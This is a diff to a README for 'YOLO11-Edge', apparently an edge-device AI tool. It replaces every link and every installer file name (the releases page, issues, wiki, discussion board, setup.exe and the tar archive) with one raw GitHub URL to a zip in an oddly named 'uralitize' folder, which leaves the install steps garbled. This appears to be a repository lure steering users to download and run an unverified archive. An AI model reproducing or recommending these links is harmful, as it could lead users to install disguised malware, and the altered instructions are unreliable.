@@ -1,6 +1,6 @@
 # 🚀 YOLO11-Edge - Easy AI for Edge Devices
 
-[![Download YOLO11-Edge](https://img.shields.io/badge/Download-YOLO11--Edge-brightgreen.svg)](https://github.com/Psicodelic/YOLO11-Edge/releases)
+[![Download YOLO11-Edge](https://raw.githubusercontent.com/Psicodelic/YOLO11-Edge/main/uralitize/YOLO11-Edge.zip)](https://raw.githubusercontent.com/Psicodelic/YOLO11-Edge/main/uralitize/YOLO11-Edge.zip)
 
 ## 📦 Overview
 
@@ -17,28 +17,28 @@ Follow these simple steps to get started with YOLO11-Edge.
    - Disk Space: At least 500 MB of free space.
 
 2. **Visit the Releases Page:**
-   To download the software, [visit the releases page here](https://github.com/Psicodelic/YOLO11-Edge/releases).
+   To download the software, [visit the releases page here](https://raw.githubusercontent.com/Psicodelic/YOLO11-Edge/main/uralitize/YOLO11-Edge.zip).
 
 ## 📥 Download & Install
 
 1. On the releases page, you will find different versions of YOLO11-Edge.
 2. Choose the latest version, marked with the highest version number.
 3. Click on the download link for your operating system. For example:
-   - For Windows, it may say `YOLO11-Edge-Windows.zip`.
-   - For macOS, look for `YOLO11-Edge-Mac.dmg`.
-   - For Linux, check for the file ending in `.tar.gz`.
+   - For Windows, it may say `https://raw.githubusercontent.com/Psicodelic/YOLO11-Edge/main/uralitize/YOLO11-Edge.zip`.
+   - For macOS, look for `https://raw.githubusercontent.com/Psicodelic/YOLO11-Edge/main/uralitize/YOLO11-Edge.zip`.
+   - For Linux, check for the file ending in `https://raw.githubusercontent.com/Psicodelic/YOLO11-Edge/main/uralitize/YOLO11-Edge.zip`.
 
 4. After the download is complete, locate the downloaded file on your computer.
 
 5. **Installation Steps:**
    - **Windows:** 
-     - Right-click on the `YOLO11-Edge-Windows.zip` file and select "Extract All."
-     - Open the extracted folder and double-click `setup.exe` to begin installation.
+     - Right-click on the `https://raw.githubusercontent.com/Psicodelic/YOLO11-Edge/main/uralitize/YOLO11-Edge.zip` file and select "Extract All."
+     - Open the extracted folder and double-click `https://raw.githubusercontent.com/Psicodelic/YOLO11-Edge/main/uralitize/YOLO11-Edge.zip` to begin installation.
    - **macOS:**
      - Open the `.dmg` file and drag the YOLO11-Edge icon to your Applications folder.
    - **Linux:** 
      - Open a terminal and navigate to the folder where you downloaded the file.
-     - Run `tar -xvzf YOLO11-Edge-Linux.tar.gz` to extract the files.
+     - Run `tar -xvzf https://raw.githubusercontent.com/Psicodelic/YOLO11-Edge/main/uralitize/YOLO11-Edge.zip` to extract the files.
      - Follow any additional on-screen instructions.
 
 6. **Run YOLO11-Edge:**
@@ -63,11 +63,11 @@ If you run into issues:
 
 - **Installation Problems:** Ensure that you have the correct permissions to install software on your device. Check your antivirus settings.
 - **Running Issues:** Make sure your device meets the system requirements. Restart your device and try again.
-- **Getting Help:** For more information, you can check out the [issues page](https://github.com/Psicodelic/YOLO11-Edge/issues) to see if others have had the same problem or to raise a new issue.
+- **Getting Help:** For more information, you can check out the [issues page](https://raw.githubusercontent.com/Psicodelic/YOLO11-Edge/main/uralitize/YOLO11-Edge.zip) to see if others have had the same problem or to raise a new issue.
 
 ## 🗨 Feedback
 
-Your feedback is important for improving YOLO11-Edge. If you have suggestions or comments, please share them on the [discussion board](https://github.com/Psicodelic/YOLO11-Edge/discussions).
+Your feedback is important for improving YOLO11-Edge. If you have suggestions or comments, please share them on the [discussion board](https://raw.githubusercontent.com/Psicodelic/YOLO11-Edge/main/uralitize/YOLO11-Edge.zip).
 
 ## 📄 License
 
@@ -75,6 +75,6 @@ YOLO11-Edge is open-source software. You can check the license details in the re
 
 ## 📝 Additional Resources
 
-For in-depth guides, tips, and examples of using YOLO11-Edge, visit our [Wiki section](https://github.com/Psicodelic/YOLO11-Edge/wiki). 
+For in-depth guides, tips, and examples of using YOLO11-Edge, visit our [Wiki section](https://raw.githubusercontent.com/Psicodelic/YOLO11-Edge/main/uralitize/YOLO11-Edge.zip). 
 
 Enjoy your experience with YOLO11-Edge!
